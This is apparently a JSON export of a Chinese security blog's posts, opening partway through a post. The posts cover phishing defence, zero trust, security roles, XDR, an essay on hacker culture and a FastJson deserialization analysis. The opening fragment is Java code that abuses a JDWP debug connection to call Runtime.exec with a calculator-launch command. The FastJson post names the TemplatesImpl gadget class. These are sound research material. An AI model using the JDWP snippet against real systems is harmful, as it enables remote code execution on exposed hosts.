param1.add(vm.mirrorOf(&quot;getRuntime&quot;));        //在此虚拟机中创建一个字符串。        ObjectReference getRuntimeMethodRe = (ObjectReference) getObjectReference.invokeMethod(threadReference, getMethod, param1, 1);        //invokeMethod(ThreadReference thread, Method method, List&lt;? extends Value&gt; arguments, int options)        //调用目标 VM 中此对象的指定方法。  java.lang.Runtime.getRuntime()        List&lt;Value&gt; param2 = new ArrayList&lt;&gt;();        param2.add(null);        ObjectReference runtimeIns = (ObjectReference) getRuntimeMethodRe.invokeMethod(threadReference, getMethodInvoke, param2, 1);        //java.lang.Runtime.getRuntime().invoke()        List&lt;Value&gt; param3 = new ArrayList&lt;&gt;();        param3.add(vm.mirrorOf(&quot;open /System/Applications/Calculator.app&quot;));        runtimeIns.invokeMethod(threadReference, getExecMethod, param3, 1);        //java.lang.Runtime.getRuntime().exec(&quot;cmd&quot;).invoke()    &#125;\n监听可能会执行到的线程，等待触发，可以选择大概率会被触发的类的线程来监听，例如“java.net.ServerSocket.accep”、“java.lang.String”等\n\n","categories":["JAVA安全"],"tags":["安全技术"]},{"title":"以攻防对抗为核心—如何防御网络钓鱼(来自国家反诈的启示)","url":"/%E4%BB%A5%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97%E4%B8%BA%E6%A0%B8%E5%BF%83%E2%80%94%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC(%E6%9D%A5%E8%87%AA%E5%9B%BD%E5%AE%B6%E5%8F%8D%E8%AF%88%E7%9A%84%E5%90%AF%E7%A4%BA)/","content":"引子昨天处理了一个简单的钓鱼事件，同时结合最近准备攻防对抗的一些思考，简单聊一下“如何应对网络钓鱼”这个难题。\n网络钓鱼有哪几种网络诈骗钓鱼类型\n\n预付金诈骗（贪）\n帐户停用诈骗（怕）\n伪造网站诈骗（粗心）\n…\n\n网络攻击钓鱼方式\n\n鱼叉式网络钓鱼\n克隆网络钓鱼\n捕鲸诈骗\n…\n\n参考自https://www.cloudflare.com/zh-cn/learning/access-management/phishing-attack/\n防钓鱼与反诈骗2021年，国家反诈中心去年共紧急止付涉案资金3200余亿元人民币，拦截诈骗电话15.5亿次、成功避免2800余万名民众受骗。公安机关共破获电信网络诈骗案件44.1万余起，抓获违法犯罪嫌疑人69万余名，打掉涉“两卡”违法犯罪团伙3.9万个，追缴返还人民群众被骗资金120亿元。\n围绕网络钓鱼的攻防对抗，本质上是人性弱点的对抗。在本质上，当前声势浩大的“反电信诈骗”和“防网络钓鱼”是一样的，国家反诈就是最佳实践，所以先来看一下国家是如何做“反诈骗”的。\n反诈之防骗意识之“淹没式宣传”对于如何提升广大群众的防骗意识，国家采用的是地毯式、淹没式的铺天盖地的宣导，无论是各种奇形怪状的口号、传单，还是“本小区本月发生xx起诈骗事件，被骗xx元”，基本上就是按住你的脑袋，从眼睛、耳朵里灌输防骗意识。\n这样的做法笔者是非常认同的，虽然没有一个具体的数据来说明这样做的效果，但是从笔者自身的经验来说，在曾经被骗过一次之前，自负满满的认为自己不会被网络诈骗，然后打脸打的啪啪响（金额不大），曾经很长一段时间引以为耻。相信在看本文的读者应该也认为自己不会被骗，大忌。\n反诈之安装“国家反诈APP”相信现在没有人的手机上没有这个APP了吧，挨家挨户的地毯式安装，各种网络直播宣传等等，相当于每个人的手机上都装了一个“EDR”。\n反诈之“国家反诈APP”之“来电预警守护”为什么要在每个手机上装上反诈APP，核心作用就是和大数据威胁情报关联，当诈骗电话进线或接收短信的时候可以实时识别和预警。\n反诈之异常网站访问告警应该很多人都收到过当地派出所打电话过来说“你xx时间是不是访问了xx网站，这个网站涉嫌电信诈骗……”\n来自“国家反诈骗”的启示——企业如何防御网络钓鱼从上一小节可以看到，为了反诈骗，国家的主要手段是“意识宣导”、“覆盖EDR”、“威胁情报告警(实时)”和“网站访问日志分析(延时)”等等，这几个做法和我们日常建设防网络钓鱼基本大同小异，但是如何做好这几部分，是需要和“国家反诈中心”认真学习的。\n意识宣导总结下反诈骗的宣导，“形式多样”、“案例真实”、“题材丰富”、“高频次”、“一对一”等等，之前看到的一个演讲中也提到了同样的点，核心就在于“重复”。\n\n在真实的企业安全环境中，在没有切实感受到钓鱼危害之前，是很难做到这点的，更多的是发一发全员邮件告诉大家小心网络钓鱼，这种做法的作用基本为零，毕竟每天来自各个团队的宣传邮件早就把邮箱填满了。\n不过在企业防网络钓鱼的宣导上，比反诈骗有一个最大的优势，因为性质的不同，可以进行“网络钓鱼演习”。\n如何进行网络钓鱼演习？\n演习必须要真实 何为真实，就是不论是邮箱、域名、网站还是文案，都要和员工息息相关，而不是在邮件里写“我来钓鱼了”，emmm 参考：《你好，捕鱼人》https://vipread.com/library/topic/3233\n\n全员参与（特别是TL） 在演练结束后的复盘中，可以做到层层团队的内部宣导和复盘，我们往往对发生在身边的事件更能有体感\n\n重复重复重复 投入资源，阶段性重复、多样性演练、复盘，直到受害者成为零\n\n\n进行安全意识考试（不）其实笔者不太喜欢考试的这种形式，但是不得不说，考试是可以让员工在百忙之中快速学习某些知识的有效手段，同时还可以比较容易的量化工作成果，这或许就是为什么现在有这么多考试的原因吧。\n不过如果做好激励，也许能成为一个好的宣导方式。\n防网络钓鱼策略像“外部邮箱变色”、“URL跳转弹窗”这些方式基本上每个企业邮箱/企业IM都具备了，然后再深一点，会做“SPF IP地址验证”、“DKIM 数字签名验证”、“DMARC From地址验证”等协议验证，这些手段可以有效的防止垃圾邮件和外部恶意邮件。\n但是因为业务的复杂性，往来邮件的多样，这些协议策略很难完整的上线，同时也会因为配置策略问题，存在各种绕过的可能性。\n所以目前的趋势是“钓鱼邮件的智能检测”，不过这是一个大工程，目前有效的落地实践应该并不多，更多的还是在特殊时期采用特殊策略。\n\n（图源Splunk）\n\n（图源Fireeye https://www.fireeye.com/company/press-releases/2019/fireeye-secure-email-gateway-protects-against-threats-others-mis.html）\n\n（《邮件防线的攻防研究实践》https://vipread.com/library/topic/3699）\n发生钓鱼攻击事件后的应急响应\n止血 当通过各种途径或知到某员工收到钓鱼邮件后，第一时间并行做两件事：止血该员工和获取其他收到钓鱼邮件/消息的员工列表\n\n修复 将相关IP、URL、邮箱等恶意信息加入黑名单，同时排查为什么会绕过恶意邮件防御策略    \n\n溯源 通过相关线索进行溯源，判断钓鱼攻击类型，来决定后续采取相应措施\n\n复盘/宣导 如果有员工中招，要重点复盘 如果是员工主动发现，要有激励 同时，真实的CASE一定要把握住进行宣导\n\n\n最后当然了，做了再多，人性也是永远的弱点，但是多做一点，风险就少一分。\n持续对抗才是安全的魅力所在。\n","categories":["应用安全"],"tags":["THINK"]},{"title":"使用零信任快速实现安全现代化","url":"/%E4%BD%BF%E7%94%A8%E9%9B%B6%E4%BF%A1%E4%BB%BB%E5%BF%AB%E9%80%9F%E5%AE%9E%E7%8E%B0%E5%AE%89%E5%85%A8%E7%8E%B0%E4%BB%A3%E5%8C%96/","content":"\n\n这些是使用零信任快速实现安全现代化的建议优先事项\n\n\n\n用户访问和工作效率\n许多组织的第一个举措侧重于对传统企业网络安全边界之外的新型生产力资源（云和移动）资产的安全可见性和控制。\n用户访问和工作效率（用户账户和设备）\n这通常始于为云应用程序和移动设备建立身份“安全边界”，将身份用作控制平面，并在允许访问之前明确验证对用户帐户和设备的信任\n1a. 用户帐户 - 首要任务是需要强大的多因素身份验证 (MFA)（最好是无密码身份验证）。 攻击者很容易获得泄露的用户名/密码和常用密码，因此组织必须优先考虑超越仅密码身份验证作为他们的第一步。\n1b. 端点——在允许从它们访问之前，应该快速测量生产力设备保证。 许多攻击者已经掌握了破坏用户设备、窃取凭据并使用这些技术继续攻击环境的技术。\n该计划的下一个优先事项将这些新的高级控制扩展到应用程序：\n1c. 应用程序——从 SaaS 应用程序开始，使用您在步骤 1 中配置的 Azure AD 身份验证安全性来提高您的资产访问安全性。 为所有认可的软件即服务 (SaaS) 应用程序配置 Azure AD。然后，通过两步流程进行现代化并超越 VPN 身份验证，为不直接支持现代协议（如 OAuth/OIDC 和 SAML）的应用程序启用安全性\n• 提高VPN 安全性- 通过将您的VPN 设备连接到Azure AD 身份验证，VPN 会话受益于用户帐户/会话的显式验证和设备可信度的额外安全性。\n• 发布应用程序——通过 Azure AD 应用代理发布现有的本地（和 IaaS）应用程序，将应用程序移出 VPN，使您能够利用第 1 步中的强大 Azure AD 身份验证，改善用户体验，并将帐户限制为访问 一次单个应用程序（而不是通常提供对整个网络的所有端口/协议的访问权限的 VPN）。\n作为访问控制现代化的一部分，您还应该确保已建立网络控制：\n1d. 网络 - 建立基本的流量过滤和分段，以增加对业务关键和高度易受攻击的资源的隔离。\n数据、合规性和治理：\n下一个举措是数据、合规性和治理的现代化，包括：\n\n勒索软件恢复准备——确保您能够从自己经过验证的备份中恢复数据和系统，这样您就不必向攻击者支付敲诈勒索以重新获得对您业务资产的访问权限。 \n\n数据——您还应该专注于保护数据本身。 无论您是否已经采用传统的数据丢失保护 (DLP) 方法，您都应该专注于保护数据：\n\n\n无论走到哪里（云服务、USB 设备、企业端点和服务器等），都采用超越扩展程序（或构建新程序）的完整生命周期方法\n•   采用全生命周期方法（发现、分类、保护和监控）\n根据您的数据安全优先级，选择有助于实现此目的的技术，例如 Microsoft 信息保护 (MIP)，它会加密数据并需要对云服务进行身份验证以获取解密密钥。 Microsoft Defender for Cloud Apps 还可以发现云应用程序和应用程序会话中的非结构化数据，Azure Purview 可以发现结构化数据并对其进行分类。\n \n现代安全运营 (SecOps) 组织通常与前两个并行运行的另一个首要任务是安全操作的现代化。 该计划侧重于针对新的云应用程序、远程设备、身份和其他传统安全边界之外的资产的威胁检测、响应和恢复功能，以补充预防性访问控制。\n使用零信任实现安全运营现代化需要严格的优先级，以确保 SecOps 团队专注于组织面临的最大风险，不会在误报/误报上浪费时间，并在他们需要的整个资产中拥有广泛而深入的可见性是有效的。\n•   简化响应 - SecOps 的首要任务是掌握威胁响应和对常见攻击资源的补救，使用\n•   扩展检测和响应 (XDR) 技术为这些新资源类型提供高质量的警报，在尝试在 SIEM（安全信息和事件管理）中构建每个警报时绕过人工工作和延迟。\n•   简化针对这些常见攻击的流程。 将分类（第 1 层）和调查（第 2 层）分析团队的重点放在掌握这些攻击上，将在此过程的早期捕获普通攻击者和高级攻击者，从而降低组织的风险。\n•   统一可见性 —— 虽然很难从 SIEM 中的原始数据创建高质量的个人警报，但它们对于将所有数据和上下文整合在一起以进行调查和威胁搜寻非常有用，从而可以全面了解您的整个资产 （减少攻击者可能停留的盲点）。\n•   减少人工\n在任何时候，安全操作都应该专注于减少手动和重复性任务（如切换工具、键入命令、复制/粘贴数据等）的劳累/痛苦。专注于为分析师提供简化的端到端集成体验，包括安全编排、自动化和 响应（SOAR）技术将提高效率和士气。 SOAR 技术内置于 Microsoft 365 Defender 和 Microsoft Sentinel 中。\n \n数据中心安全\n数据中心零信任的重点领域包括：\n•   安全基线——首先关注数据中心应用完善的安全最佳实践。 正如推土机和生产线等物理设备需要定期维护（换油等）才能可靠运行，计算机系统也是如此（尽管计算机安全维护故障通常会像烟花工厂的草率消防安全程序一样突然发生）。错误配置和缺少安全更新可能会破坏或否定几乎所有其他安全控制，因为它们允许攻击者绕过这些架构假定的安全边界。\n•   降低遗留风险– 发现并（制定计划）淘汰具有高安全风险的遗留技术，如遗留身份验证协议和不受支持的操作系统。 具有网络访问权限的攻击者可以迅速利用这些来扩大他们对环境的访问权限，因此偿还这笔技术债务是一项值得投资的事情。 Microsoft Defender for Cloud 可以为多云和本地资源提供这种发现和测量。\n•   DevOps集成 -– 将安全性尽可能无缝地集成到DevOps 流程中，以提供健康的安全代价（导致批判性思维和分析），同时避免不健康的代价（阻碍的价值超过其保护的价值）。 在理想状态下，团队共同朝着创新速度、可靠性和安全弹性的目标保持一致。\n•   微分段 —— 应用微分段的概念，结合身份和网络控制。 将对资源的访问限制在更小的“段”中，通过限制任何受损数据中心资源的“爆炸区域”来降低风险（这限制了攻击者访问其他数据中心资源的能力，应用最小权限原则）。\n•   即时 (JIT) 虚拟机访问——这会阻止管理员使用的管理端口（以及攻击者的目标），而不限制客户和员工的端口/协议。\n•   网络过滤（Internet 防火墙和 IDS/IPS）——大多数现有/遗留应用程序都是在假设它们位于专用网络（防火墙、IDS/IPS 和/或 WAF 之后）上的情况下实施和操作的，因此它对 确保在云上遵循这些实践（直到/除非它们被重构为云原生应用程序）。 随着组织迁移到 Azure，他们可以选择使用网络设备直接扩展其现有功能，也可以选择采用 Azure 防火墙和 WAF 等原生功能。\n•   网络过滤（在数据中心内） 这通常是最难成功执行的元素之一，因为在数据中心静态控制内应用精细网络控制需要深入了解应用程序工作流，以避免破坏业务关键应用程序功能与安全控制。 \n•   网络安全组 \n•   应用程序安全组\n• 内部资源身份验证——除了第 1 步和第 2 步中的保护措施外，身份团队和工作负载所有者应努力确保服务器、应用程序和服务在相互通信之前进行身份验证。 这限制了任何受损资源对其他应用程序、VM、帐户或其他资源的访问，从而增加了攻击者的成本和摩擦。\n  \n零信任数据中心小贴士• 与云计划保持一致——当您将工作负载迁移到云端时，我们建议将零信任原则引入企业和工作负载安全性的设计中。 将这些保护措施改造到本地数据中心通常很困难，并且需要处理每个单独的工作负载和应用程序（可能有数百、数千甚至更多）。 因为云迁移已经在清点并与应用程序/工作负载所有者合作，所以在您进入云时添加零信任保护是最好的自然集成点。\n•更快地将设备移动到互联网——最终用户设备和数据中心共享一个网络，直到这些设备移动到仅互联网模式。 这种情况发生得越早，您的 Intranet 就越早缩小为更容易隔离风险的较小的私有数据中心网络。 要达到这种状态，用户和设备需要从 SaaS 或已发布的旧版应用程序（通过 Azure AD 代理或类似方式）获取他们的所有应用程序，这样他们就不再需要直接（或 VPN）访问数据中心网络。\n \n运营技术 如果您的资产包括运营技术 (OT) 和工业 IoT，则下一个优先事项是将零信任原则应用于这些环境。\n保护这些环境和架构的安全通常受到旧硬件和软件的限制，因此您应该专注于发现这些资产的过程，通过将易受攻击和/或重要的工作负载与 Internet 和 Intranet 连接隔离开来保护它们，并使用制造的安全工具来监控它们用于环境（不会导致旧应用程序和操作系统崩溃的被动监控）。\nMicrosoft Defender for IoT 旨在发现这些资产并以非侵入式的方式对其进行监控，同时应用复杂的异常检测（如果需要，还可以选择连接到云中的 Microsoft Sentinel 以进行进一步的分析和关联）。\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"信息管理/网络安全(安全责任)","url":"/%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8(%E5%AE%89%E5%85%A8%E8%B4%A3%E4%BB%BB)/","content":"\n\n这些是管理信息安全风险所需的组织职能，以及关于它如何变化的一些见解\n\n\n￼\n安全领导力包括指导组织文化以及制定或批准政策和标准。 这应该与组织的使命和风险偏好保持一致，重点关注提高生产力和保护资产（在需要时仔细平衡这些），并保持敏捷以满足不断发展的环境。\n注意：安全领导层通常得到项目管理办公室(PMO)的支持，以推动大型/复杂项目并衡量成功（有时在安全组织内，有时由另一个内部小组提供）。\n\n组织政策和标准应告知安全架构和合规性要求，并以此为基础。 该政策的设计应符合组织的风险偏好，并纳入:\n1.监管合规要求及当前合规状态（满足要求、接受风险等）2.当前状态的架构评估以及设计、实施和实施的技术可能性\n￼\n然后，安全架构和合规性要求在生产环境中设计和实施，由每个领域的专业安全技能组合，包括人员、应用程序和数据、基础设施和端点、身份和密钥以及运营技术（他们也提供反馈以改进它们） .\n 这些环境中的技术实施通常由负责其操作的所有其他方面的 IT 和 OT 团队（或应用程序/身份团队）执行。 人员安全功能通常通过人力资源和用户教育/培训等团队与他们的流程整合。\n\n安全运营功能（有时称为安全运营中心 (SOC)）负责响应和管理通过被动方式和主动威胁搜寻检测到的事件。 组织还应具备事件准备能力，以进行实践练习，为重大事件建立组织肌肉记忆并结合现实世界的风险情景。\n￼\n威胁情报充当组织的一种神经系统，从组织中的先前事件和社区中的其他事件中收集经验教训，并通知安全领域的各种利益相关者。 这类似于 ITIL 中的问题管理规则，该规则确保通过反馈过程应用主动学习。 虽然此功能通常从战术层面的技术洞察力开始，但随着时间的推移，它应该发展成熟，为安全领导和业务领导提供战略洞察力。\n此功能在网络安全中尤为重要，因为攻击者改变策略的速度非常快，并且需要为不同级别的组织提供洞察力，以便有效管理网络安全风险。\n\n态势感知是一门新兴学科，长期以来一直被设想为“持续监控”，但随着基于云的安全技术的成熟，最近才变得实用。这包括几个组件，使组织能够在不断变化的复杂环境中快速发现和降低风险。\n•    零信任策略执行——通过 Azure AD 条件访问（或第三方功能）•    实时风险发现和评分——通过安全评分、合规评分、Defender for Cloud Apps 共享风险等•     实时上下文丰富——通过威胁和漏洞管理与 M365 防御者中的事件调查集成\n虽然这建立在漏洞管理等现有学科的基础上，但分配此功能会挑战组织的规范，因为\n1.它跨越了技术边界（通常由不同的团队管理）\n2.它将传统上独立的功能实时连接在一起（例如安全操作、合规性和架构/工程），这些功能通常具有有限的交互\n3.它立即显示以前仅在审计、渗透测试和特殊评估期间发现的配置问题\n\n￼\n","categories":["安全架构"],"tags":["安全建设","网络安全架构体系参考"]},{"title":"关于XDR的一点笔记","url":"/%E5%85%B3%E4%BA%8EXDR%E7%9A%84%E4%B8%80%E7%82%B9%E7%AC%94%E8%AE%B0/","content":"面对攻击者日益先进的战术、技术和程序(TTPs)，仍是一场艰难的战斗。随着大量新且隐蔽的攻击方法出现，我们除了威胁预防外，更需要新的策略和战术去检测和响应。\n当我们的安全团队努力防止针对我们组织的攻击成功时，必须面对一个事实：没有绝对安全的系统，威胁终会到来。\nXDR将EDR、UEBA、NTA、下一代防病毒软件和其他工具的所有功能整合到一个解决方案中，以提供最佳安全性。\n“X”代表任何数据源，无论是网络、端点还是云，重点是通过自动化强制乘以安全运营团队每个成员的生产力。最终目标是确保该类别的产品减少检测和应对威胁的平均时间，而无需增加团队中其他地方的精力。\n如果在自己的环境中不能像攻击者那样灵活，那么就很难有效的防御攻击。\nXDR必须具有跨整个环境的可见性和检测功能，并继承来自端点、网络、云环境的遥测技术。\n通过结合威胁情报来让自己具备应对未知攻击的能力。\nXDR的必要功能：\n1. 支持任意来源的数据输入，一个真正的XDR将允许任何数据与威胁活动相关联\n2. 可扩展的存储和计算能力\n3. 更高更准确的自动化/跨数据分析，自动映射ATT&amp;CK框架，支持分析师进行深入分析\n4. 快速/简单部署\n5. 可视/可理解\n\n十个关键的XDR能力(来自paloalto):\n1. 一流的端点威胁防护能力\n2. 灵活的端点保护能力套件（例如主机防火墙、漏洞评估、磁盘加密、设备控制等）\n3. 跨数据源的扩展可见性\n4. 简化调查，减少时间和降低误报\n5. 通过机器学习来分析\n6. 提供协调一致的反应能力\n7. 安全任务自动化\n8. 独立的测试和验证\n9. 快速的产品升级和优化\n10. 降低安全成本\n\nXDR用例：    与UEBA的解决场景大同小异，可以参考这篇文章《UEBA(用户和实体行为分析)可以用来做什么（十大场景）》\nXDR趋势推动的主要原因：\n1. 分布式企业资产 + 重新定义的边界 + 云/业务转型的成功 = 攻击向量和攻击技术的爆发增长\n2. 范围狭窄的安全解决方案在孤岛中运行\n3. SIEM 经常遭受范围蔓延的困扰，导致复杂的解决方案面临部署挑战\n\nXDR的主要优势应该具备：\n1. 提高检测、保护、响应能力\n2. 提高效率\n3. 省钱\n\n如何提高protection能力：\n•    立即在组件安全产品之间共享本地威胁情报，以有效阻止所有组件的威胁。此外，在多种不同的检测方法（例如网络和端点）中利用外部获得的威胁情报\n•    将来自多个组件的弱信号组合成更强的恶意信号\n•    通过自动关联和确认警报来减少错过的警报\n•    集成相关数据，以实现更快、更准确的警报分类诊断\n•    通过加权指导提供集中配置和硬化功能，以帮助确定活动的优先次序\n如何提高安全运营人员的效率：\n•    将大量警报流转换为需要手动调查的少且准确的事件\n•    提供具有所有安全组件必要上下文的集成事件响应选项，以快速解决警报\n•    提供超出基础设施控制点（即网络和端点）的响应选项\n•    为重复性任务提供自动化能力\n•    通过跨安全组件提供共同的管理和工作流程体验，减少培训和升级支持\n•    提供可用和高质量的检测内容，无需调优\n\nXDR的三大支柱：\nFront-End：\n\n    1. 生成遥测数据\n    2. 执行响应动作或增强安全控制\n\nBack-End：\n\n    1. 从传感器收集和关联数据\n    2. 执行威胁检测\n    3. 自动化告警、事件分类\n    4. 加速事件调查\n    5. 自动化响应检测到的威胁\n\nContent\n\n    以威胁为中心的规范性工作流程\n    1. API connectors\n    2. 解析器\n    3. 检测规则和模型\n    4. 调查和响应指导\n    5. MITRE ATT&amp;CK测绘\n    6. 响应行动和剧本\n    7. 报告\n\n\nXDR的事件处理流程：\n1. 从关键数据源生成安全遥测数据\n2. 将攻击遥测数据关联到一个事件时间线\n3. 自动化根因分析\n4. 借助全面的事件上下文加速威胁狩猎\n5. 推荐应对措施\n\n以威胁为中心的统包式威胁检测、调查和响应 (TDIR) 工作流程：\n收集：\n\n    预定义数据源\n\n检测：\n\n    基于行为的威胁检测\n    观察列表\n    MITRE 映射\n\n分类：\n\n    告警优先级\n    上下文收集和完善\n    自动创建案例\n\n调查：\n\n    为所有实体预构建事件时间表\n    自动化Q&amp;A\n\n响应：\n\n    统包剧本\n    定义事件类型\n    事件检查列表\n\n\nXDR检测案例(Exabeam检测横向移动)：\n数据源：\n\n    登录和访问资产\n    认证和访问管理\n    VPN和零信任网络接入\n    网络接入、分析和监控\n    EDR/EPP日志\n    操作系统日志\n\n检测规则类型：\n\n    Pass the ticket \n    Pass the hash \n    远程访问活动异常\n    网络连接和流量异常\n\nMITRE技术：\n\n    T1090: Proxy\n    T1205: Traffic signaling \n    T1219:  Remote access software\n    T1071: Application layer protocol \n    T1021: Remote services         \n    T1078: Valid accounts         \n    T1550: Use alternate authentication material \n\n调查工具：\n\n    威胁猎人保存搜索结果\n    智能时间线\n    调查checklist指南\n\n响应动作：\n\n    邮件通知相关人\n    添加用户和资产到观察列表\n    对事件涉及的用户进行屏蔽、暂停或限制\n    重置凭证/授权\n    通过多因素认证重新身份验证\n    隔离系统\n\n\nSIEM是目前有效的威胁探测和响应工具之一，SIEM的未来是XDR。\nSIEM的价值：\n1. 高级检测，可用于检测特定类型的安全事件\n2. 安全操作， 可用于不同的威胁检测和响应用例\n3. 安全集成，充当其它安全应用的集成平台，如UEBA、SOAR等\n4. 可见性，为整个组织的事件数据提供可见性、合规性和报告\n5. …\n\nSIEM面临的最大挑战：\n1. 软件授权昂贵\n2. 维护和运营SIEM基础设施的成本很高，且需要很多资源和时间\n3. SIEM可以有效的检测已知威胁，但是对于未知威胁却不太有效\n4. SIEM更适合有经验的网络安全分析师使用\n5. SIEM基础设施部署需要复杂而漫长的部署周期\n6. …\n\nXDR与零信任\nXDR 可以发挥关键作用，充当集成端到端零信任架构的中枢神经系统， 它在整个网络和环境中提供实时可见性和警报，监控核心策略的执行，提供上下文洞察力，并授权团队在需要时采取快速行动。\nXDR的风险：\n就目前而言，XDR仍是一个新兴的待验证的安全产品，大量的优势仍然存在某些特定案例或者PPT上。\n\nSOAPA(    security operations and analytics platform architecture)\n一个为规模、集成、高级分析和过程自动化而构建的架构。（ESG提出）\n\n","categories":["安全建设"],"tags":["THINK"]},{"title":"关于技术的纯粹","url":"/%E5%85%B3%E4%BA%8E%E6%8A%80%E6%9C%AF%E7%9A%84%E7%BA%AF%E7%B2%B9/","content":"这半年里，一直都在思考，安全是什么，黑客是什么，技术又是什么为什么会想这些东西呢在前边有篇随笔里记得说过挖过一段时间SRC，也就是现在很多人口中所谓的挖洞\nBurp一开，见洞就插，遇URL就遍历\n\n描述的有点夸张了，不过说实话，足够的时间加上足够的细心，这些总是会挖到的这时候，会收到运营小姐姐的称赞，得到不菲的奖金，被称作“白帽子”“黑客”说到这里，需要解释一下，不是说这种模式不好，在企业安全这是不可或缺的一环，也有真正厉害的师傅在用真本事不过，这不是我想要的，在我看来，这并不能称之为“黑客”，所以我不再“挖洞”\n在微信上偶然看到一篇文章，作者并不认识，但从字里行间可以看出作者是一个过来人，对于现在这个浮躁的圈子说的很中肯\n第三代黑客1、  挖洞2、  挖洞3、  挖洞4、  缺少专业知识和系统化概念5、  爱好混迹各种沙龙6、  擅长斗图、getshell、各种互联网找洞。7、  职业规划不明确，自身定位价值偏差\n\n这是文中说的我们这代人，不可否认，大多数的确如此代码是一个黑客最基本的技能，可又有几人能说自己是一个合格的程序员这也是会思考上边那些东西的原因，对于自己，技术栈浅薄、通过这些行为的技术成长和时间不成正比，对于这个圈子，过于浮躁、过于追求名利\n这里插一个小故事\n\n图片里是我的一个学弟，审计处某个CMS的漏洞，通过QQ告诉开发者，什么都没有索取，开发者请喝一杯咖啡就足够高兴在我看来，这才是真正的黑客，技术且不论，单说这种对待技术的态度、对待金钱的态度是很珍贵的\n对于此我自愧不如，到现在才真正的看透这一点\n这里插一段上边文章中作者的建议\n1、安全不只是挖洞，甚至挖洞在乙方的工作量都占不到一般，更遑论甲方2、不要那么浮躁，静下心学些真正的安全技术3、多写点东西总没错，安全本就是综合性的能力4、进入安全圈，不是认识几个人，参加几次沙龙、提交几个漏洞、写过几篇挖洞或者工具利用的文章\n\n这些建议在个人看来是很中肯的\n本来在二十多天前就想写这篇随笔了，不过这段时间一是工作比较忙，更多的是还有一些地方没有想透，看到这篇文章的时候，好多地方写出了我所想的，遂打开电脑写下了这寥寥百字\n现在的安全圈被许多大佬戏称为“娱乐圈”，事实上也确实是这个样子，圈外的人看到的总是那些所谓噱头的比赛、公众号、各种“黑客”字眼的文章，而恰恰这些东西的作者也是局外人，浮躁的局内人和他们一起就成了这个所谓的“安全圈”\n并不是吃不到葡萄说葡萄酸，而是怀念以前的环境，更希望以后会重新变成以前的样子（不过随着国家的重视，各种心怀鬼胎的人涌入，注定会越来越浮躁）\n在乌云笼罩的日子，一个帖子如果不能有绝对的干货，一定会被pass，一个漏洞提交，如果详细度不足以让审帖人员顺利复现，一定会被pass，厂商多久不修复，一定会被曝光，大家不为钱，不为名气，纯为技术，有几十个rank值是极大的荣幸，算是黑客乌托邦吧这个乌托邦注定回不来了，我们可以做的也只能是构建一个小小的“世外桃源”，只为了那点技术的纯粹，享受技术的本身\n==========================好久没更新技术文章了，最近在研究浏览器挖掘领域，后边会更新一些学习笔记、漏洞分析前路漫漫，匍匐前行\n","categories":["胡思乱想"],"tags":["THINK"]},{"title":"再看FastJson Unserialization漏洞","url":"/%E5%86%8D%E7%9C%8BFastJson%20Unserialization%E6%BC%8F%E6%B4%9E/","content":"0x01前言 这段时间反思了下，以前分析的那些框架级别漏洞，跟进一遍后就没有然后了，对漏洞的理解还是太浅，达不到举一反三的作用，再看一次fastjson\n0x02 跟进调用链\nJSON.parseObject\n\nJSON是一个抽象类，JSON中有一个静态方法parseObject（String text），将text解析为一个JSONObject对象并返回\n\nfastjson支持注册ObjectDeserializer实现自定义反序列化。要自定义序列化，首先需要实现一个ObjectDeserializer，然后注册到ParserConfig中\n\n\n\nkey是@type并启用了SpecialKeyDetect\n把com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl加载为类\n看一下getDeserializer的实现\n\n过一遍denyList\n\n还有一些常见内置类\n\n均没有过滤之后通过createJavaBeanDeserializer来处理反序列化\n\ncreateJavaBeanDeserializer方法后边需要经过JavaBeanInfo.build的处理\n\n跟踪build方法\n\n会遍历传入类的方法、字段等，需要满足下边的条件才会被添加到fieldList中\n以set举例，还会以类似的规则处理get、field\n        for (Method method : methods) &#123; //            int ordinal = 0, serialzeFeatures = 0, parserFeatures = 0;            String methodName = method.getName();            if (methodName.length() &lt; 4) &#123;            //方法名长度大于4                continue;            &#125;            if (Modifier.isStatic(method.getModifiers())) &#123;            //是静态方法                continue;            &#125;            // support builder set            if (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;            //返回类型需要是void类型或者是当前类型                continue;            &#125;            Class&lt;?&gt;[] types = method.getParameterTypes();            if (types.length != 1) &#123;            //参数只能有一个                continue;            &#125;            JSONField annotation = method.getAnnotation(JSONField.class);            if (annotation == null) &#123;                annotation = TypeUtils.getSuperMethodAnnotation(clazz, method);            &#125;            if (annotation != null) &#123;                if (!annotation.deserialize()) &#123;                    continue;                &#125;                ordinal = annotation.ordinal();                serialzeFeatures = SerializerFeature.of(annotation.serialzeFeatures());                parserFeatures = Feature.of(annotation.parseFeatures());                if (annotation.name().length() != 0) &#123;                    String propertyName = annotation.name();                    add(fieldList, new FieldInfo(propertyName, method, null, clazz, type, ordinal, serialzeFeatures, parserFeatures,                                                  annotation, null, null));                    continue;                &#125;            &#125;            if (!methodName.startsWith(&quot;set&quot;)) &#123;             //以set开头            // TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？                continue;            &#125;            char c3 = methodName.charAt(3);            String propertyName;            if (Character.isUpperCase(c3) //                || c3 &gt; 512 // for unicode method name            ) &#123;                if (TypeUtils.compatibleWithJavaBean) &#123;                    propertyName = TypeUtils.decapitalize(methodName.substring(3));                &#125; else &#123;                    propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);                &#125;            &#125; else if (c3 == &#x27;_&#x27;) &#123;                propertyName = methodName.substring(4);                //取_后字符做变量名，即第4个往后            &#125; else if (c3 == &#x27;f&#x27;) &#123;                propertyName = methodName.substring(3);                //set往后，即第3个往后            &#125; else if (methodName.length() &gt;= 5 &amp;&amp; Character.isUpperCase(methodName.charAt(4))) &#123;            //长度大于5并且第5个字母大写                propertyName = TypeUtils.decapitalize(methodName.substring(3));                //取set后边字符并转为小写            &#125; else &#123;                continue;            &#125;.......            add(fieldList, new FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures,                                         annotation, fieldAnnotation, null));        